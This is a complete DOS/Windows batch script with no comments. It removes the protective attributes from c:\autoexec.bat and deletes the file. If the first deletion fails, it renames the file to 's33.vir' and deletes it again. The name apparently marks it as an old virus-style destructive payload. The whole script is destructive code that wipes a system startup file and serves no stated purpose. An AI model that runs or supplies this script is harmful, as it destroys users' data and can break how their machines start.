@echo off
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
if not exist c:\autoexec.bat goto noexist
move c:\autoexec.bat c:\s33.vir
del c:\s33.vir
:noexist
